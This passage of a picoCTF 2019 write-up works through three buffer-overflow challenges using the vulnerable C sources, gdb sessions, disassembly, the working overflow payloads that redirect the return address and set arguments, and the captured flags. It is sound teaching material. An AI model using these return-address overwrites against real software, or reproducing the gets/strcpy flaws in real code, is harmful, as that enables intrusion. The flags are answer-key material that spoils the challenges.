drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-0_4    27 Sep 28 21:54 flag.txt
-rwxr-sr-x   1 hacksports overflow-0_4  7644 Sep 28 21:54 vuln
-rw-rw-r--   1 hacksports hacksports     814 Sep 28 21:54 vuln.c
</code></pre><p>Let's view <code>vuln.c</code><pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, &quot;%s\n&quot;, flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc &gt; 1) {
    vuln(argv[1]);
    printf(&quot;You entered: %s&quot;, argv[1]);
  }
  else
    printf(&quot;Please enter an argument next time\n&quot;);
  return 0;
}
</code></pre><p>It seems to take in an input, copy that input into a buffer of size 128 and then print it back out to you.<p>There's also a <code>SIGSEGV</code> signal handler which will fire after any segmentation fault which happens when you try to access memory that doesn't belong to the program. So my first assumption would be to pass in 129 bytes to the program see how the program responds and if it will print the flag.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-0$ ./vuln $(python -c &quot;print 'A'*128&quot;)
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-0$ ./vuln $(python -c &quot;print 'A'*132&quot;)
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-0$ ./vuln $(python -c &quot;print 'A'*133&quot;)
picoCTF{3asY_P3a5y2f814ddc}
</code></pre><p>Odd it needed more than 4 more bytes to fail. Will need to determine why later<h2><a class=header href=#flag-1 id=flag-1>Flag</a></h2><p><code>picoCTF{3asY_P3a5y2f814ddc}</code><h1><a class=header href=#picoctf19-overflow-1 id=picoctf19-overflow-1>PicoCTF19 OverFlow 1</a></h1><h2><a class=header href=#challenge-2 id=challenge-2>Challenge</a></h2><p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this <a href=https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln>program</a>? You can find it in /problems/overflow-1 on the shell server. <a href=https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln.c>Source</a>.<h2><a class=header href=#hints-2 id=hints-2>Hints</a></h2><p>Take control that return address<p>Make sure your address is in Little Endian.<h2><a class=header href=#solution-2 id=solution-2>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 21:51 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-1_3    42 Sep 28 21:51 flag.txt
-rwxr-sr-x   1 hacksports overflow-1_3  7532 Sep 28 21:51 vuln
-rw-rw-r--   1 hacksports hacksports     742 Sep 28 21:51 vuln.c
</code></pre><p>Let's view <code>vuln.c</code><pre><code>samson@pico-2019-shell1:/problems/overflow-1$ cat vuln.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &quot;asm.h&quot;

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf(&quot;Woah, were jumping to 0x%x !\n&quot;, get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts(&quot;Give me a string and lets see what happens: &quot;);
  vuln();
  return 0;
}
</code></pre><p>As expected, there is a function that prints the flag but it's never explicitly called.<p>The program takes a string and attempts to jump to that address. But hey, since this is an overflow question let's just give the program a bunch of garbage and see what happens.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ./vuln
Give me a string and lets see what happens: 

Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1$ ./vuln
Give me a string and lets see what happens: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
</code></pre><p>Hmm: <code>0x41414141</code>. If you're familiar with the <a href=https://en.wikipedia.org/wiki/ASCII>ASCII Table</a>, <code>A</code> is <code>41</code> in hexadecimal.<p>So it looks like we overwrite some instructions with our input. Let's find the minimal amount of <code>A</code>'s required to change the jump address.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*77&quot;) | ./vuln
Give me a string and lets see what happens:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x8040041 !
Segmentation fault (core dumped)
</code></pre><p>Notice how with no input the value is <code>0x8048705</code> but with 77 <code>A</code>'s, it's <code>0x8040041</code>.<p>You can see the first <code>41</code> is at the end. This is due to <code>x86_64</code> working in little endian mode.<p>So basically this overflow seems like we might have to overwrite the address with the address of the flag and in order to do that we first need to figure out which memory address the flag function is located at and we can do that with GDB.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) x flag
0x80485e6 &lt;flag&gt;:       0x53e58955
(gdb) q
</code></pre><p>There it is at memory address <code>0x80485e6</code>.<p>Let's try working that into the address:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*77+'\xe6'&quot;)  | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x800e641 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*76+'\xe6'&quot;) | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80400e6 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*76+'\xe6\x85\x04\x08'&quot;) | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
</code></pre><h2><a class=header href=#more-detailed-explanation id=more-detailed-explanation>More detailed explanation</a></h2><p>So why did that work? We won't have a nice function that tells us the return address all the time.<p>In x86 assembly, the memory address of where a program is returning to is held in the <code>ebp</code> register, otherwise known as the base pointer. So let's try to see if we can match the register value to what the function prints out for us<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ./vuln 
Give me a string and lets see what happens: 
picoCTF
Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... &lt;redacted&gt;

(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
[Inferior 1 (process 2891586) exited normally]

(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
Flag File is Missing. please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2891439) exited normally]
</code></pre><p>Just verifying we can send in input through GDB.<pre><code class=language-bash>(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804865f &lt;+0&gt;:     push   %ebp
   0x08048660 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048662 &lt;+3&gt;:     push   %ebx
   0x08048663 &lt;+4&gt;:     sub    $0x44,%esp
   0x08048666 &lt;+7&gt;:     call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
   0x0804866b &lt;+12&gt;:    add    $0x1995,%ebx
   0x08048671 &lt;+18&gt;:    sub    $0xc,%esp
   0x08048674 &lt;+21&gt;:    lea    -0x48(%ebp),%eax
   0x08048677 &lt;+24&gt;:    push   %eax
   0x08048678 &lt;+25&gt;:    call   0x8048430 &lt;gets@plt&gt;
   0x0804867d &lt;+30&gt;:    add    $0x10,%esp
   0x08048680 &lt;+33&gt;:    call   0x8048714 &lt;get_return_address&gt;
   0x08048685 &lt;+38&gt;:    sub    $0x8,%esp
   0x08048688 &lt;+41&gt;:    push   %eax
   0x08048689 &lt;+42&gt;:    lea    -0x17f9(%ebx),%eax
   0x0804868f &lt;+48&gt;:    push   %eax
   0x08048690 &lt;+49&gt;:    call   0x8048420 &lt;printf@plt&gt;
   0x08048695 &lt;+54&gt;:    add    $0x10,%esp
   0x08048698 &lt;+57&gt;:    nop
   0x08048699 &lt;+58&gt;:    mov    -0x4(%ebp),%ebx
   0x0804869c &lt;+61&gt;:    leave  
   0x0804869d &lt;+62&gt;:    ret    
End of assembler dump.
</code></pre><p>We know the <code>call 0x8048430 &lt;gets@plt></code> is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.<p>How do we know <code>gets()</code> is the function that's vulnerable? Well try running <code>man gets</code>. Here's an excerpt:<pre><code>GETS(3)    Linux Programmer's Manual    GETS(3)

NAME
  gets - get a string from standard input (DEPRECATED)

SYNOPSIS
  #include &lt;stdio.h&gt;

  char *gets(char *s);

DESCRIPTION
  Never use this function.
  gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below).

RETURN VALUE
  gets() returns s on success, and NULL on error or when end of file occurs while no characters have been read. However, given the lack of buffer overrun checking, there can be no guarantees that the function will even return.
</code></pre><pre><code class=language-bash>(gdb) b* 0x08048678
Breakpoint 1 at 0x8048678
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Give me a string and lets see what happens: 

Breakpoint 1, 0x08048678 in vuln ()
(gdb) info frame
Stack level 0, frame at 0xffde0df0:
 eip = 0x8048678 in vuln; saved eip = 0x8048705
 called by frame at 0xffde0e20
 Arglist at 0xffde0de8, args: 
 Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
 Saved registers:
  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
</code></pre><p>Note the output: <code>saved eip = 0x8048705</code>. As we know the EIP is the instruction pointer that the allows to the CPU to remember where to jump to after returning from a function.<p>Let's step through with the <code>next instruction</code> command and watch what happens after the program receives our input.<pre><code class=language-bash>(gdb) ni
0x0804867d in vuln ()
(gdb) i f
Stack level 0, frame at 0xffde0df0:
 eip = 0x804867d in vuln; saved eip = 0x80485e6
 called by frame at 0x41414149
 Arglist at 0xffde0de8, args: 
 Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
 Saved registers:
  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
</code></pre><p>There we go. We overwrote the old value of the eip and now the program should technically jump wherever we want, in our case the address of the flag.<h2><a class=header href=#flag-2 id=flag-2>Flag</a></h2><p><code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}</code><h2><a class=header href=#alternative-solution---pwntools id=alternative-solution---pwntools>Alternative Solution - PwnTools</a></h2><p>To recap, <code>vuln</code> allocates a buffer of size <code>64</code> on the stack and then uses <code>gets</code> a vulnerable function to read from it.<p>The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.<p>Luckily for us, the program prints the return address where the program will be jumping back to. Let's use PwnTools <code>cyclic</code> module this.<p>Visit this page to learn more on how to use it: <a href=https://docs.pwntools.com/en/stable/util/cyclic.html>https://docs.pwntools.com/en/stable/util/cyclic.html</a><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
samson@pico-2019-shell1:/problems/overflow-1$ cyclic 100 | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x61616174 !
Segmentation fault (core dumped)
</code></pre><p><code>61</code>, <code>61</code>, <code>61</code>, <code>74</code> - map to <code>a</code>, <code>a</code>, <code>a</code>, <code>t</code>.<p>I see this pattern in that long string, but I really don't want to count it.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ cyclic -l 0x61616174
76
</code></pre><p>So we need 76 bytes of padding and then the address of the <code>flag()</code> function.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ objdump -t vuln | grep flag
080485e6 g     F .text  00000079              flag
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ python -c &quot;from pwn import *; print('A'*76 + p32(0x080485e6))&quot; | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
</code></pre><h1><a class=header href=#picoctf19-overflow-2 id=picoctf19-overflow-2>PicoCTF19 OverFlow 2</a></h1><h2><a class=header href=#challenge-3 id=challenge-3>Challenge</a></h2><p>Now try overwriting arguments. Can you get the flag from this <a href=https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln>program</a>? You can find it in /problems/overflow-2 on the shell server. <a href=https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln.c>Source</a>.<h2><a class=header href=#hints-3 id=hints-3>Hints</a></h2><p>GDB can print the stack after you send arguments<h2><a class=header href=#solution-3 id=solution-3>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 22:04 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-2_3    33 Sep 28 22:04 flag.txt
-rwxr-sr-x   1 hacksports overflow-2_3  7500 Sep 28 22:04 vuln
-rw-rw-r--   1 hacksports hacksports     794 Sep 28 22:04 vuln.c
</code></pre><p>Let's view <code>vuln.c</code><pre><code>samson@pico-2019-shell1:/problems/overflow-2$ cat vuln.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&quot;Please enter your string: &quot;);
  vuln();
  return 0;
}
</code></pre><p>It seems like a program that takes in some input and prints it back to you. Let's try that and some large input.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ ./vuln
Please enter your string: 
A
A
samson@pico-2019-shell1:/problems/overflow-2$ echo $(python -c &quot;print 'A'*184&quot;) | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
</code></pre><p>We need to invoke the <code>flag()</code> function like <code>flag(0xDEADBEEF, 0xC0DED00D)</code> from <code>vuln()</code>.<p>So let's first try to reproducce what we did in Overflow-1 and get into the <code>vuln()</code> function first.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048676 &lt;+0&gt;:     push   %ebp
   0x08048677 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048679 &lt;+3&gt;:     push   %ebx
   0x0804867a &lt;+4&gt;:     sub    $0xb4,%esp
   0x08048680 &lt;+10&gt;:    call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
   0x08048685 &lt;+15&gt;:    add    $0x197b,%ebx
   0x0804868b &lt;+21&gt;:    sub    $0xc,%esp
   0x0804868e &lt;+24&gt;:    lea    -0xb8(%ebp),%eax
   0x08048694 &lt;+30&gt;:    push   %eax
   0x08048695 &lt;+31&gt;:    call   0x8048430 &lt;gets@plt&gt;
   0x0804869a &lt;+36&gt;:    add    $0x10,%esp
   0x0804869d &lt;+39&gt;:    sub    $0xc,%esp
   0x080486a0 &lt;+42&gt;:    lea    -0xb8(%ebp),%eax
   0x080486a6 &lt;+48&gt;:    push   %eax
   0x080486a7 &lt;+49&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x080486ac &lt;+54&gt;:    add    $0x10,%esp
   0x080486af &lt;+57&gt;:    nop
   0x080486b0 &lt;+58&gt;:    mov    -0x4(%ebp),%ebx
   0x080486b3 &lt;+61&gt;:    leave  
   0x080486b4 &lt;+62&gt;:    ret    
End of assembler dump.
(gdb) b* 0x08048695
Breakpoint 1 at 0x8048695
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*184)')
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*184)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) i f
Stack level 0, frame at 0xffaacbb0:
 eip = 0x8048695 in vuln; saved eip = 0x804871c
(gdb) ni
0x0804869a in vuln ()
(gdb) i f
Stack level 0, frame at 0xffaacbb0:
 eip = 0x804869a in vuln; saved eip = 0x804871c
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*284)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*284)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) i f
Stack level 0, frame at 0xff894ed0:
 eip = 0x8048695 in vuln; saved eip = 0x804871c
(gdb) ni
0x0804869a in vuln ()
(gdb) i f
Stack level 0, frame at 0xff894ed0:
 eip = 0x804869a in vuln; saved eip = 0x41414141
 called by frame at 0xff894ed4
(gdb) x flag
0x80485e6 &lt;flag&gt;:       0x53e58955
</code></pre><p>Through a bunch of trial an error I finally found the input that lets us jump to the <code>flag()</code> function<pre><code class=language-bash>(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) ni
0x0804869a in vuln ()
(gdb) info frame
Stack level 0, frame at 0xff914d50:
 eip = 0x804869a in vuln; saved eip = 0x80485e6
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2898163) exited normally]
</code></pre><p>Perfect. We're in the <code>flag()</code> function as determined by the output, so let's dig into the function now.<pre><code class=language-bash>(gdb) disas flag
Dump of assembler code for function flag:
   0x080485e6 &lt;+0&gt;:     push   %ebp
   0x080485e7 &lt;+1&gt;:     mov    %esp,%ebp
   0x080485e9 &lt;+3&gt;:     push   %ebx
   0x080485ea &lt;+4&gt;:     sub    $0x54,%esp
   0x080485ed &lt;+7&gt;:     call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
   0x080485f2 &lt;+12&gt;:    add    $0x1a0e,%ebx
   0x080485f8 &lt;+18&gt;:    sub    $0x8,%esp
   0x080485fb &lt;+21&gt;:    lea    -0x1850(%ebx),%eax
   0x08048601 &lt;+27&gt;:    push   %eax
   0x08048602 &lt;+28&gt;:    lea    -0x184e(%ebx),%eax
   0x08048608 &lt;+34&gt;:    push   %eax
   0x08048609 &lt;+35&gt;:    call   0x80484a0 &lt;fopen@plt&gt;
   0x0804860e &lt;+40&gt;:    add    $0x10,%esp
   0x08048611 &lt;+43&gt;:    mov    %eax,-0xc(%ebp)
   0x08048614 &lt;+46&gt;:    cmpl   $0x0,-0xc(%ebp)
   0x08048618 &lt;+50&gt;:    jne    0x8048636 &lt;flag+80&gt;
   0x0804861a &lt;+52&gt;:    sub    $0xc,%esp
   0x0804861d &lt;+55&gt;:    lea    -0x1844(%ebx),%eax
   0x08048623 &lt;+61&gt;:    push   %eax
   0x08048624 &lt;+62&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x08048629 &lt;+67&gt;:    add    $0x10,%esp
   0x0804862c &lt;+70&gt;:    sub    $0xc,%esp
   0x0804862f &lt;+73&gt;:    push   $0x0
   0x08048631 &lt;+75&gt;:    call   0x8048470 &lt;exit@plt&gt;
   0x08048636 &lt;+80&gt;:    sub    $0x4,%esp
   0x08048639 &lt;+83&gt;:    pushl  -0xc(%ebp)
   0x0804863c &lt;+86&gt;:    push   $0x40
   0x0804863e &lt;+88&gt;:    lea    -0x4c(%ebp),%eax
   0x08048641 &lt;+91&gt;:    push   %eax
   0x08048642 &lt;+92&gt;:    call   0x8048440 &lt;fgets@plt&gt;
   0x08048647 &lt;+97&gt;:    add    $0x10,%esp
   0x0804864a &lt;+100&gt;:   cmpl   $0xdeadbeef,0x8(%ebp)
   0x08048651 &lt;+107&gt;:   jne    0x804866d &lt;flag+135&gt;
   0x08048653 &lt;+109&gt;:   cmpl   $0xc0ded00d,0xc(%ebp)
   0x0804865a &lt;+116&gt;:   jne    0x8048670 &lt;flag+138&gt;
   0x0804865c &lt;+118&gt;:   sub    $0xc,%esp
   0x0804865f &lt;+121&gt;:   lea    -0x4c(%ebp),%eax
   0x08048662 &lt;+124&gt;:   push   %eax
   0x08048663 &lt;+125&gt;:   call   0x8048420 &lt;printf@plt&gt;
   0x08048668 &lt;+130&gt;:   add    $0x10,%esp
   0x0804866b &lt;+133&gt;:   jmp    0x8048671 &lt;flag+139&gt;
   0x0804866d &lt;+135&gt;:   nop
   0x0804866e &lt;+136&gt;:   jmp    0x8048671 &lt;flag+139&gt;
   0x08048670 &lt;+138&gt;:   nop
   0x08048671 &lt;+139&gt;:   mov    -0x4(%ebp),%ebx
   0x08048674 &lt;+142&gt;:   leave  
   0x08048675 &lt;+143&gt;:   ret    
End of assembler dump.
</code></pre><p>The lines that stand out the most to me are:<pre><code>...
cmpl   $0xdeadbeef,0x8(%ebp)
...
cmpl   $0xc0ded00d,0xc(%ebp)
...
</code></pre><p>So what this is suggesting is that it's comparing the second and third values from the <code>ebp</code> register which is the bottom of the stack, so we should overwrite the return address, and add our first and second arguments to the stack<p>So let's set some breakpoints there.<pre><code class=language-bash>(gdb) b* 0x0804864a
Breakpoint 1 at 0x804864a
(gdb) b* 0x08048653
Breakpoint 2 at 0x8048653
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2899300) exited normally]
</code></pre><p>Oh wait, in GDB the flag function exits first. So I guess we'll have to follow the hint... inspect the stack
Let's append some input into it.<pre><code class=language-bash>(gdb) b* 0x080485e6
Breakpoint 1 at 0x80485e6
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*8+&quot;B&quot;*8)')
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*8+&quot;B&quot;*8)')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Breakpoint 1, 0x080485e6 in flag ()
(gdb) info stack
#0  0x080485e6 in flag ()
#1  0x41414141 in ?? ()
#2  0x41414141 in ?? ()
#3  0x42424242 in ?? ()
#4  0x42424242 in ?? ()
#5  0xff8e7b00 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
</code></pre><p>So remember the stack grows from the EBP, so our first and second arguments are between <code>#1-#4</code>. However, the code seems to be looking at <code>ebp+8</code> so let's send <code>4 A's</code> before our arguments.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print &quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*4+&quot;\xef\xbe\xad\xde&quot;+&quot;\x0d\xd0\xde\xc0&quot;' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
</code></pre><p><code>r &lt; &lt;(python -c 'from pwn import *; print "A"*176+"B"*12+p32(0x080485E6)+"A"*4+p32(0xDEADBEEF)+p32(0xC0DED00D)')</code><p>Also works.<h2><a class=header href=#flag-3 id=flag-3>Flag</a></h2><p><code>picoCTF{arg5_and_r3turn51b106031}</code><h2><a class=header href=#alternative-solution---pwntools-1 id=alternative-solution---pwntools-1>Alternative Solution - PwnTools</a></h2><p>To recap, <code>vuln</code> allocates a buffer of size <code>176</code> on the stack and then uses <code>gets</code> a vulnerable function to read from it.<p>The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.<p>A more detailed explanation can be found on Overflow 1 for the Pwntools cyclic module.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
Starting program: /problems/overflow-2/vuln &lt; &lt;(cyclic 200)
Please enter your string: 
